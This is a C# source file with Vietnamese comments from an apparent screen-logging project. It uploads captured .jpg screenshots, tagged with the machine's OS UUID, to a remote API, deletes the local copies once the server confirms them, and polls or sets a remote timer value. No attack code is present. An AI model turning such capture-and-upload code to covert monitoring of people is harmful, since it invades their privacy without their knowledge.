using Newtonsoft.Json; // Thư viện hỗ trợ việc xử lý JSON
using System;
using System.Net.Http; // Thư viện HTTP để thực hiện yêu cầu POST
using System.Threading.Tasks; // Hỗ trợ xử lý bất đồng bộ (async/await)
using System.Collections.Generic; // Sử dụng danh sách
using System.Text.Json.Serialization; // Dùng để ánh xạ thuộc tính JSON
using System.IO;
using LogScreen.Utils; // Thư viện xử lý file

namespace LogScreen.Managers
{
    /// <summary>
    /// Định nghĩa lớp phản hồi từ API Check
    /// </summary>
    public class ApiResponseGetCheck
    {
        [JsonPropertyName("value")] // Mapped tới thuộc tính "value" trong JSON
        public int value { get; set; }
    }

    /// <summary>
    /// Định nghĩa lớp phản hồi từ API Check
    /// </summary>
    public class ApiResponseSetCheck
    {
        [JsonPropertyName("success")] // Mapped tới thuộc tính "success" trong JSON
        public string success { get; set; }
    }

    /// <summary>
    /// Định nghĩa lớp phản hồi từ APIUPload
    /// </summary>
    public class ApiResponseUpload
    {
        [JsonPropertyName("success")] // Mapped tới thuộc tính "success" trong JSON
        public bool Success { get; set; } // Xác định trạng thái thành công hay thất bại

        [JsonPropertyName("files")] // Mapped tới thuộc tính "files" trong JSON
        public List<FileResponse> Files { get; set; } // Danh sách các tệp tin trả về từ API
    }

    /// <summary>
    /// Lớp chứa thông tin của mỗi tệp trong phản hồi API upload
    /// </summary>
    public class FileResponse
    {
        [JsonPropertyName("file")] // Mapped tới thuộc tính "file" trong JSON
        public string File { get; set; } // Tên tệp tin

        [JsonPropertyName("message")] // Mapped tới thuộc tính "message" trong JSON
        public string Message { get; set; } // Thông điệp phản hồi từ API
    }

    // Lớp quản lý việc upload tệp tin lên API
    public class APIUploader
    {
        /// <summary>
        /// Hàm upload danh sách tệp tin lên API và xóa các tệp đã được upload thành công
        /// </summary>
        /// <param name="filePaths">Danh sách đường dẫn các tệp tin cần upload</param>
        /// <param name="osUUID">ID định danh thư mục hoặc hệ điều hành</param>
        /// <param name="apiUrl">URL của API</param>
        /// <param name="authToken">Token xác thực</param>
        public async Task UploadFileAsync(List<string> filePaths, string osUUID, string apiUrl, string authToken)
        {
            try
            {
                // Lấy danh sách ảnh đã lưu từ thư mục thay vì nhận từ bên ngoài
                string captureDirectory = FileHelper.GetCaptureAddress();

                if (Directory.Exists(captureDirectory))
                {
                    // Tìm tất cả các file .jpg nếu filePaths là null hoặc rỗng
                    if (filePaths == null || filePaths.Count == 0)
                    {
                        filePaths = new List<string>(Directory.GetFiles(captureDirectory, "*.jpg"));
                        Console.WriteLine($"Tìm thấy {filePaths.Count} ảnh cần upload.");
                    }
                }
                else
                {
                    FileHelper.LogError("Thư mục lưu ảnh không tồn tại.");
                    throw new Exception("Thư mục lưu ảnh không tồn tại.");
                }

                // Tạo HttpClient để gửi yêu cầu HTTP
                using (var client = new HttpClient())
                using (var content = new MultipartFormDataContent())
                {
                    // Thêm token xác thực vào header HTTP
                    client.DefaultRequestHeaders.Add("token", authToken);

                    // Thêm ID thư mục (osUUID) vào form-data
                    content.Add(new StringContent(osUUID), "folder_id");

                    // Danh sách các tệp đã upload thành công
                    List<string> successfullyUploadedFiles = new List<string>();

                    // Thêm từng file trong danh sách tệp cần upload vào form
                    foreach (var filePath in filePaths)
                    {
                        // Kiểm tra tệp tồn tại
                        if (File.Exists(filePath))
                        {
                            // Tạo StreamContent để đọc nội dung tệp
                            var fileStream = new StreamContent(File.OpenRead(filePath));
                            fileStream.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                            content.Add(fileStream, "files[]", Path.GetFileName(filePath)); // Gắn tệp vào form-data
                        }
                        else
                        {
                            // Hiển thị thông báo khi không tìm thấy tệp
                            Console.WriteLine($"File not found: {filePath}");
                        }
                    }

                    // Gửi yêu cầu POST đến API
                    var response = await client.PostAsync(apiUrl, content);

                    // Đọc phản hồi JSON từ API
                    string jsonResponse = await response.Content.ReadAsStringAsync();
                    var apiResponse = JsonConvert.DeserializeObject<ApiResponseUpload>(jsonResponse);

                    // Kiểm tra phản hồi thành công
                    if (apiResponse != null && apiResponse.Success)
                    {
                        // Lặp qua danh sách các file được xử lý trong phản hồi API
                        foreach (var file in apiResponse.Files)
                        {
                            Console.WriteLine($"File: {file.File}, Message: {file.Message}");
                            successfullyUploadedFiles.Add(file.File); // Lưu file đã upload thành công
                        }

                        // Xóa tệp tin đã upload thành công khỏi hệ thống
                        foreach (var fileName in successfullyUploadedFiles)
                        {
                            // Kết hợp đường dẫn thư mục với tên file
                            string fullFilePath = Path.Combine(captureDirectory, fileName);

                            if (File.Exists(fullFilePath))
                            {
                                File.Delete(fullFilePath); // Xóa tệp
                                Console.WriteLine($"Đã xóa: {fullFilePath}"); // Xác nhận xóa
                            }
                            else
                            {
                                Console.WriteLine($"Không tìm thấy file: {fullFilePath}"); // Thông báo khi không tìm thấy file
                            }
                        }

                    }
                    else
                    {
                        // Thông báo khi yêu cầu thất bại hoặc không có tệp nào được tải lên
                        FileHelper.LogError("Request failed or no files uploaded.");
                        throw new Exception("Request failed or no files uploaded.");
                    }
                }
            }
            catch (Exception ex)
            {
                // Hiển thị thông báo lỗi
                FileHelper.LogError($"Error: {ex.Message}");
                throw; // Ném ngoại lệ trở lại để trình xử lý lỗi ở cấp cao hơn
            }
        }
        /// <summary>
        /// Gửi yêu cầu đến API với các tham số linh động và trả về kết quả phản hồi.
        /// </summary>
        /// <param name="osUUID">ID của thư mục</param>
        /// <param name="apiUrl">URL của API</param>
        /// <param name="authToken">Token xác thực</param>
        /// <param name="modeCheck">Phương thức kiểm tra (get_value)</param>
        /// <returns>Đối tượng ApiResponseGetCheck chứa thông tin phản hồi</returns>
        public async Task<int> GetCheckTimer(string osUUID, string apiUrl, string authToken, string modeCheck)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Xây dựng URL với các tham số động
                    string requestUrl = $"{apiUrl}?folder_id={osUUID}&method={modeCheck}";

                    // Thêm token vào Header
                    client.DefaultRequestHeaders.Add("token", authToken);

                    // Gửi yêu cầu GET đến API
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Đọc nội dung phản hồi từ API
                    string responseContent = await response.Content.ReadAsStringAsync();

                    // Xử lý phản hồi JSON
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Thành công: {responseContent}");
                        // Deserialize phản hồi JSON thành đối tượng ApiResponseCheck
                        ApiResponseGetCheck apiResponse = JsonConvert.DeserializeObject<ApiResponseGetCheck>(responseContent);

                        // Trả về đối tượng phản hồi
                        return apiResponse.value;
                    }
                    else
                    {
                        FileHelper.LogError($"Lỗi: {response.StatusCode} - {responseContent}");
                        throw new Exception();
                    }
                }
            }
            catch (Exception ex)
            {

                FileHelper.LogError($"Lỗi xảy ra: {ex.Message}");
                throw new Exception(ex.Message);
            }
        }

        /// <summary>
        /// Gửi yêu cầu đến API với các tham số linh động và trả về kết quả phản hồi.
        /// </summary>
        /// <param name="osUUID">ID của thư mục</param>
        /// <param name="apiUrl">URL của API</param>
        /// <param name="authToken">Token xác thực</param>
        /// <param name="modeCheck">Phương thức kiểm tra (set_vaue)</param>
        /// <param name="dataValue">Giá trị dữ liệu</param>
        /// <returns>true nếu thành công</returns>
        public async Task<bool> SetCheckTimer(string osUUID, string apiUrl, string authToken, string modeCheck, int dataValue)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Xây dựng URL với các tham số động
                    string requestUrl = $"{apiUrl}?folder_id={osUUID}&method={modeCheck}";

                    if (modeCheck == Constant.ModeCheckTimer.Set)
                    {
                        requestUrl += $"&data_value={dataValue}";
                    }

                    // Thêm token vào Header
                    client.DefaultRequestHeaders.Add("token", authToken);

                    // Gửi yêu cầu GET đến API
                    HttpResponseMessage response = await client.GetAsync(requestUrl);

                    // Đọc nội dung phản hồi từ API
                    string responseContent = await response.Content.ReadAsStringAsync();

                    // Xử lý phản hồi JSON
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Thành công: {responseContent}");
                        // Deserialize phản hồi JSON thành đối tượng ApiResponseCheck
                        ApiResponseSetCheck apiResponse = JsonConvert.DeserializeObject<ApiResponseSetCheck>(responseContent);

                        // Trả về đối tượng phản hồi
                        return apiResponse.success == "check.txt set by data_value to 0";
                    }
                    else
                    {
                        FileHelper.LogError($"Lỗi: {response.StatusCode} - {responseContent}");
                        throw new Exception();
                    }
                }
            }
            catch (Exception ex)
            {

                FileHelper.LogError($"Lỗi xảy ra: {ex.Message}");
                throw new Exception(ex.Message);
            }
        }

    }
}